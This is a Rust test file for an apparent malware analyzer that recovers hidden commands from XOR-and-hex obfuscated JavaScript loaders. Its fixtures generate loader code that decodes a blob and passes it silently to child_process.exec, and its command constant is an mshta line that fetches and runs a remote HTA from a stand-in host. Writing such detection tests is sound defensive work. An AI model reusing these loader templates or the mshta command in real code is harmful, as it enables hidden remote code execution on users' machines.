#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    reason = "invalid fixtures should fail the test"
)]
use super::*;
const COMMAND: &str = "mshta https://program.fixturetests.net/control.hta";
fn encoded(command: &str, key: u8) -> String {
    hex::encode(command.bytes().map(|b| b ^ key).collect::<Vec<_>>())
}
fn map_source(key: u8) -> String {
    format!(
        "const {{exec: dispatch}} = require('node:child_process');\nconst BLOB='{}'; const KEY={key};\nfunction f(){{const command=Buffer.from(BLOB,'hex').map((b)=>b ^ KEY).toString('utf8'); dispatch(command,{{windowsHide:true}},()=>{{}});}}",
        encoded(COMMAND, key)
    )
}
fn loop_source(key: u8) -> String {
    format!(
        "const cp=require('child_process');\nconst BLOB='{}'; const KEY={key};\nfunction f(){{const raw=Buffer.from(BLOB,'hex');const plain=Buffer.alloc(raw.length);for(let i=0;i<raw.length;i++){{plain[i]=raw[i]^KEY;}}(0,cp.exec)(plain.toString('utf8'),{{windowsHide:true}},()=>{{}});}}",
        encoded(COMMAND, key)
    )
}
fn run_as(source: &str, name: &str) -> Vec<Command> {
    let ctx = crate::analysis_context::AnalysisContext::open(
        std::path::Path::new(name),
        source.as_bytes(),
    );
    ctx.source_ast().map(decode).unwrap_or_default()
}
fn run(source: &str) -> Vec<Command> {
    run_as(source, "input.js")
}
// Independent reference for the old conservative byte-range semantics.
fn mutation_oracle(context: &Context<'_, '_>, name: &str) -> bool {
    context.nodes.iter().any(|n| {
        let target = match n.kind() {
            "assignment_expression" | "augmented_assignment_expression" => {
                n.child_by_field_name("left")
            }
            "update_expression" => n.child_by_field_name("argument"),
            "unary_expression"
                if n.child_by_field_name("operator")
                    .and_then(|n| context.text(n))
                    == Some("delete") =>
            {
                n.child_by_field_name("argument")
            }
            _ => None,
        };
        target.is_some_and(|target| context.mentions(target, name))
    })
}

#[test]
fn mutation_index_preserves_nested_and_computed_target_semantics() {
    let source = "a = value; b += rhs; ++c; d--; delete object[key];\n\
            ({item: e, ...rest} = input); [f, g[index]] = list;\n\
            outer[inner = key2] = rhs2; const untouched = readOnly;";
    let analysis = crate::analysis_context::AnalysisContext::open(
        std::path::Path::new("mutations.js"),
        source.as_bytes(),
    );
    let context = collect_context(analysis.source_ast().unwrap()).unwrap();
    for name in context.refs.keys() {
        assert_eq!(
            context.mutated(name),
            mutation_oracle(&context, name),
            "{name}"
        );
    }
    for name in [
        "a", "b", "c", "d", "object", "key", "e", "rest", "f", "g", "index", "outer", "inner",
        "key2",
    ] {
        assert!(context.mutated(name), "{name}");
    }
    for name in [
        "value",
        "rhs",
        "input",
        "list",
        "rhs2",
        "untouched",
        "readOnly",
    ] {
        assert!(!context.mutated(name), "{name}");
    }
}

#[test]
fn large_bundle_keeps_command_recovery() {
    let mut source = map_source(57);
    for n in 0..2_000 {
        use std::fmt::Write;
        writeln!(source, "ordinaryCall{n}(argument{n});").unwrap();
    }
    let commands = run(&source);
    assert_eq!(commands.len(), 1);
    assert_eq!(commands[0].text, COMMAND);
}

#[test]
#[ignore = "relative timing benchmark; run in an optimized build on an idle host"]
fn mutation_index_avoids_quadratic_bundle_walks() {
    let mut source = String::from("mutable++;\n");
    let names: Vec<_> = (0..2_000).map(|n| format!("ordinaryCall{n}")).collect();
    for name in &names {
        use std::fmt::Write;
        writeln!(source, "{name}(argument);").unwrap();
    }
    let analysis = crate::analysis_context::AnalysisContext::open(
        std::path::Path::new("bundle.js"),
        source.as_bytes(),
    );
    let context = collect_context(analysis.source_ast().unwrap()).unwrap();
    let start = std::time::Instant::now();
    for name in &names {
        assert!(!std::hint::black_box(mutation_oracle(&context, name)));
    }
    let sequential = start.elapsed();
    let start = std::time::Instant::now();
    for name in &names {
        assert!(!std::hint::black_box(context.mutated(name)));
    }
    let indexed = start.elapsed();
    eprintln!("2,000 mutation lookups: tree walks={sequential:?}, indexed={indexed:?}");
    assert!(
        indexed * 8 < sequential,
        "mutation lookup must avoid repeated full-tree walks"
    );
}

#[test]
fn map_and_loop_recover_exact_bytes_with_varying_keys() {
    for key in [1, 57, 81, 255] {
        for source in [map_source(key), loop_source(key)] {
            let out = run(&source);
            assert_eq!(out.len(), 1, "{source}");
            assert_eq!(out[0].text, COMMAND);
            assert_eq!(
                out[0].offset as usize,
                source
                    .find(&format!("'{}'", encoded(COMMAND, key)))
                    .unwrap()
            );
            assert_eq!(out[0].file_type, FileType::Batch);
        }
    }
}
#[test]
fn renamed_locals_swapped_xor_and_prefix_increment_work() {
    let source = loop_source(81)
        .replace("BLOB", "DATA")
        .replace("KEY", "BYTE_KEY")
        .replace("raw", "input")
        .replace("plain", "output")
        .replace("i++", "++i")
        .replace("input[i]^BYTE_KEY", "BYTE_KEY^input[i]");
    assert_eq!(run(&source)[0].text, COMMAND);
    let source = map_source(81)
        .replace("b ^ KEY", "KEY ^ b")
        .replace("'utf8'", "'UTF-8'");
    assert_eq!(run(&source)[0].text, COMMAND);
}
#[test]
fn esm_imports_and_pure_return_callbacks_work() {
    let source = map_source(57)
        .replace(
            "const {exec: dispatch} = require('node:child_process');",
            "import {exec as dispatch} from 'node:child_process';",
        )
        .replace("(b)=>b ^ KEY", "function(b){return b ^ KEY;}");
    assert_eq!(run_as(&source, "input.ts")[0].text, COMMAND);
    let source = loop_source(57).replace(
        "const cp=require('child_process');",
        "import * as cp from 'node:child_process';",
    );
    assert_eq!(run_as(&source, "input.ts")[0].text, COMMAND);
    let source = map_source(57)
        .replace("exec: dispatch", "exec")
        .replace("dispatch(command", "exec(command");
    assert_eq!(run(&source)[0].text, COMMAND);
}
#[test]
fn rejects_mutation_shadowing_escapes_and_unknown_shells() {
    for source in [
        map_source(81).replace("const KEY=", "let KEY="),
        map_source(81).replace("function f()", "function f(KEY)"),
        map_source(81).replace("function f()", "function f(dispatch)"),
        map_source(81).replace("function f()", "function f(Buffer)"),
        map_source(81) + "\nKEY=9;",
        map_source(81) + "\nmutate(Buffer);",
        map_source(81).replace("windowsHide:true", "shell:'/bin/echo'"),
        map_source(81).replace("windowsHide:true", "...options"),
        map_source(81).replace("{windowsHide:true}", "options"),
        map_source(81).replace("node:child_process", "other-library"),
    ] {
        assert!(run(&source).is_empty(), "{source}");
    }
}
#[test]
fn rejects_incomplete_or_modified_loops() {
    for source in [
        loop_source(57).replace("i++", "j++"),
        loop_source(57).replace("i<raw.length", "i<=raw.length"),
        loop_source(57).replace("let i=0", "let i=1"),
        loop_source(57).replace("plain[i]=raw[i]^KEY;", "plain[i]=raw[i]^KEY; sideEffect();"),
        loop_source(57).replace("plain[i]=raw[i]^KEY;", "other[i]=raw[i]^KEY;"),
        loop_source(57).replace("Buffer.alloc(raw.length)", "Buffer.alloc(raw.length+1)"),
        loop_source(57).replace("(0,cp.exec)", "use(raw);(0,cp.exec)"),
        loop_source(57).replace("(0,cp.exec)", "plain[0]=0;(0,cp.exec)"),
        loop_source(57).replace("plain.toString", "other.toString"),
        loop_source(57).replace("function f()", "mutate(cp); function f()"),
    ] {
        assert!(run(&source).is_empty(), "{source}");
    }
}
#[test]
fn rejects_inaccessible_imports_and_reassigned_require() {
    let import = "const {exec: dispatch} = require('node:child_process');";
    for source in [
        map_source(81).replace(import, &format!("function other(){{{import}}}")),
        map_source(81).replace(import, &format!("if(enabled){{{import}}}")),
        format!("require = otherLoader;\n{}", map_source(81)),
        format!("require = otherLoader;\n{}", loop_source(81)),
    ] {
        assert!(run(&source).is_empty(), "{source}");
    }
    let source = map_source(81)
        .replace(import, "")
        .replace("function f(){", &format!("function f(){{{import}"));
    assert_eq!(run(&source)[0].text, COMMAND);
}
#[test]
fn rejects_unsupported_codecs_callbacks_and_carriers() {
    for source in [
        map_source(81).replace("'hex'", "'base32'"),
        map_source(81).replace("b ^ KEY", "transform(b)"),
        map_source(81).replace("b ^ KEY", "b + KEY"),
        map_source(81).replace("Buffer.from(BLOB", "Buffer.from(other"),
        map_source(81).replace("'utf8'", "'utf16le'"),
        map_source(81).replace("dispatch(command", "console.log(command"),
        map_source(81).replace(".map((b)=>b ^ KEY)", ".map(callback)"),
        map_source(81) + "\neval(unknownCode);",
    ] {
        assert!(run(&source).is_empty(), "{source}");
    }
}
#[test]
fn nul_buffers_and_noncanonical_hex_are_not_executable_command_layers() {
    let original = encoded(COMMAND, 81);
    for command in [format!("{COMMAND}\0"), format!("{COMMAND}\0x")] {
        assert!(run(&map_source(81).replace(&original, &encoded(&command, 81))).is_empty());
    }
    let mut invalid = original.clone();
    invalid.replace_range(0..1, "g");
    for hex in [format!("{original}0"), invalid] {
        assert!(run(&map_source(81).replace(&original, &hex)).is_empty());
    }
}
#[test]
fn unified_batch_layer_preserves_hash_encoding_and_source_facts() {
    let source = loop_source(57);
    let analyzer =
        super::super::unified::UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript)
            .unwrap()
            .with_engine(crate::Engine::empty());
    let report = analyzer.analyze_source(std::path::Path::new("input.js"), &source);
    let sha = crate::analyzers::utils::calculate_sha256(COMMAND.as_bytes());
    let child = report
        .files
        .iter()
        .find(|f| f.sha256 == sha)
        .expect("decoded command");
    assert_eq!(child.file_type, "batch");
    assert_eq!(
        child.encoding.as_deref(),
        Some(["hex".into(), "xor".into()].as_slice())
    );
    let view = child.filefacts.as_ref().unwrap();
    assert_eq!(
        view.values.pointer("/source/batch/command_sites/0/text"),
        Some(&COMMAND.into())
    );
}
